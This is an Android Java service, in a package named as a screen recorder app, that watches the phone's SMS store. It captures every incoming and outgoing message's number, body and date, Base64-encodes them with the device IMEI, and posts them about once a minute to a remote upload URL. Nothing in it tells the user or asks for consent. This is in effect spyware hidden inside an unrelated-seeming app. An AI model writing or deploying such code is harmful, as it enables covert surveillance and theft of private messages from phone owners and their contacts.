package com.recorder.screen.screen_recorder.services;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.recorder.screen.screen_recorder.helper.UrlDemo;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.InputStream;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class InOutSmsService extends Service {
    String time_stamp;
    private static final String CONTENT_SMS = "content://sms";
    StringBuffer stringBuffer = null;
    public static boolean Sms_start = false;
    String IncSmsData;
    Timer mytimer;

    private class MyContentObserver extends ContentObserver {

        Context context;
        private SharedPreferences prefs;
        private String phoneNumberBlocked;

        public MyContentObserver(Context context) {
            super(null);
            this.context = context;
        }

        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);

            prefs = context.getSharedPreferences("video.android.combine", Context.MODE_PRIVATE);
            phoneNumberBlocked = prefs.getString("numero", "");

            Uri uriSMSURI = Uri.parse(CONTENT_SMS);
            Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, null);

            if (cur.moveToNext()) {
                String message_id = cur.getString(cur.getColumnIndex("_id"));
                String type = cur.getString(cur.getColumnIndex("type"));
                String numeroTelephone = cur.getString(cur.getColumnIndex("address")).trim();
                String content = cur.getString(cur.getColumnIndex("body"));
                String date = cur.getString(cur.getColumnIndex("date"));
                Long timestamp = Long.parseLong(date);
                Calendar calendar = Calendar.getInstance();
                calendar.setTimeInMillis(timestamp);
                Date finaldate = calendar.getTime();
                String smsDate = finaldate.toString();


                if (type.equals("1")) {
                    Log.d("IncomingSMS", "IncomingSMS = ");

                    System.out.println(message_id);
                    System.out.println(type);
                    System.out.println(numeroTelephone);
                    System.out.println(content);
                    System.out.println(smsDate);

                    stringBuffer = new StringBuffer();
                    stringBuffer.append("\n" + type + "#,$");
                    stringBuffer.append("\n" + numeroTelephone + "#,$");
                    stringBuffer.append("\n" + content + "#,$");
                    stringBuffer.append("\n" + smsDate + "#,$" + "\n");
                    stringBuffer.append("\n---------------");
                    System.out.println("response in::-" + stringBuffer);


                } else if (type.equals("2")) {
                    Log.d("OutGoingSMS", "OutGoingSMS = ");

                    System.out.println(message_id);
                    System.out.println(type);
                    System.out.println(numeroTelephone);
                    System.out.println(content);
                    System.out.println(smsDate);

                    stringBuffer = new StringBuffer();

                    stringBuffer.append("\n" + type + "#,$" + "\n" + numeroTelephone + "#,$" + "\n" + content + "#,$" + "\n" + smsDate + "\n");
                    stringBuffer.append("\n---------------");
                    System.out.println("response out:::----" + stringBuffer);
                } else {
                    Log.d("SmsNotFound", "SMsNotFound---- ");
                }

            }//crv if end
        }//onchange()End

        @Override
        public boolean deliverSelfNotifications() {
            return false;
        }
    }//MyContentObserverEnd

    @Override
    public void onCreate() {
        MyContentObserver contentObserver = new MyContentObserver(getApplicationContext());
        ContentResolver contentResolver = getBaseContext().getContentResolver();
        contentResolver.registerContentObserver(Uri.parse(CONTENT_SMS), true, contentObserver);

    }
    //@Override
   /* public void onStart(Intent intent, int startId) {
        Sms_start = true;

        SendSmsData();
        Timer mytimer = new Timer();
        mytimer.schedule(new TimerTask() {
            @Override
            public void run() {
                SendSmsData();
            }
        },20000,60500);

        super.onStart(intent, startId);
    }*/

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Sms_start = true;
        // SendSmsData();
        mytimer = new Timer();
        mytimer.schedule(new TimerTask() {
            @Override
            public void run() {
                Log.e(".............", "----------------------------------------- InOutSmsService");
                SendSmsData();
            }
        }, 20000, 60500);//change Timer Value
        return super.onStartCommand(intent, flags, startId);
    }

    public void SendSmsData() {
        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        String imei = tm.getDeviceId();
        byte[] imeibase = imei.getBytes();
        String imeibaseEncode = android.util.Base64.encodeToString(imeibase, android.util.Base64.DEFAULT);
        String ImeiBaseString = imeibaseEncode.replaceAll("\n", "");
        try {
            String IncSms = android.util.Base64.encodeToString(stringBuffer.toString().getBytes(), android.util.Base64.DEFAULT);
            IncSmsData = IncSms.replaceAll("\n", "");
            System.out.println("SmsData = " + IncSmsData);
        } catch (Exception e) {
            Log.d(getClass().getSimpleName(), "SMSException = " + e);
        }


        try {
            Date dt = new Date();
            int min = dt.getMinutes();
            int hr = dt.getHours();
            String strmin = "", strhr = "";
            if (min < 10)
                strmin = "0" + Integer.toString(min);
            else
                strmin = Integer.toString(min);
            if (hr < 10)
                strhr = "0" + Integer.toString(hr);
            else
                strhr = Integer.toString(hr);
            time_stamp = "" + strhr + "_" + strmin + "_" + Integer.toString(dt.getMonth() + 1) + "_" + Integer.toString(dt.getDate()) + "_" + Integer.toString(dt.getYear() + 1900) + "_";
        } catch (Exception e) {
            Log.d(getClass().getSimpleName(), "Exception:" + e);

        }

        try {
            SharedPreferences sp = getSharedPreferences("key", 0);
            String tValue = sp.getString("chksms", "");
            Log.d("checkcon-------", "smsSharedvaluereceive::::------" + tValue);

            String IncFileName = "Sms.txt";
            String IncFnameBase = android.util.Base64.encodeToString(IncFileName.toString().getBytes(), android.util.Base64.DEFAULT);
            String IncFnameString = IncFnameBase.replaceAll("\n", "");

            String fsupload = UrlDemo.fsupload;
            InputStream CallStream = null;
            HttpClient httpClient = new DefaultHttpClient();
            HttpPost httpPost = new HttpPost(fsupload);
            List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();

            ConnectivityManager connectivity;
            NetworkInfo wifiInfo;
            connectivity = (ConnectivityManager) getApplicationContext().getSystemService(Context.CONNECTIVITY_SERVICE);
            wifiInfo = connectivity.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
            NetworkInfo wifiInfo1 = connectivity.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
            if (wifiInfo.getState().toString().equalsIgnoreCase("CONNECTED") && tValue.equalsIgnoreCase("A")) {
                nameValuePairs.add(new BasicNameValuePair("IMEI", ImeiBaseString));
                nameValuePairs.add(new BasicNameValuePair("FNAME", IncFnameString));
                nameValuePairs.add(new BasicNameValuePair("DATA", IncSmsData));

                httpPost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePairs));
                HttpResponse httpResponse = httpClient.execute(httpPost);
                httpResponse.getStatusLine();
                HttpEntity entity = httpResponse.getEntity();
                entity = httpResponse.getEntity();

                InputStream in = entity.getContent();
                String buffer = "";
                for (int i = in.read(); i != -1; i = in.read()) {
                    buffer += (char) i;
                    i++;
                }
                Log.d("Test", "Response of Sms = " + buffer);
                stringBuffer.setLength(0);
            } else if (wifiInfo1.getState().toString().equalsIgnoreCase("CONNECTED") && tValue.equalsIgnoreCase("A1")) {
                nameValuePairs.add(new BasicNameValuePair("IMEI", ImeiBaseString));
                nameValuePairs.add(new BasicNameValuePair("FNAME", IncFnameString));
                nameValuePairs.add(new BasicNameValuePair("DATA", IncSmsData));

                httpPost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePairs));
                HttpResponse httpResponse = httpClient.execute(httpPost);
                httpResponse.getStatusLine();
                HttpEntity entity = httpResponse.getEntity();
                entity = httpResponse.getEntity();

                InputStream in = entity.getContent();
                String buffer = "";
                for (int i = in.read(); i != -1; i = in.read()) {
                    buffer += (char) i;
                    i++;
                }
                Log.d("Test", "Response of Sms = " + buffer);
                stringBuffer.setLength(0);
            } else {
                Log.d("checkconError", "SMs Services connection erro");
                return;
            }
            stringBuffer.setLength(0);
        } catch (Exception e) {
            Log.d(getClass().getSimpleName(), "Sms = " + e);
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        Sms_start = false;
        try {
        mytimer.cancel();
        } catch (Exception e) {}
        stopSelf();
        super.onDestroy();
    }
}
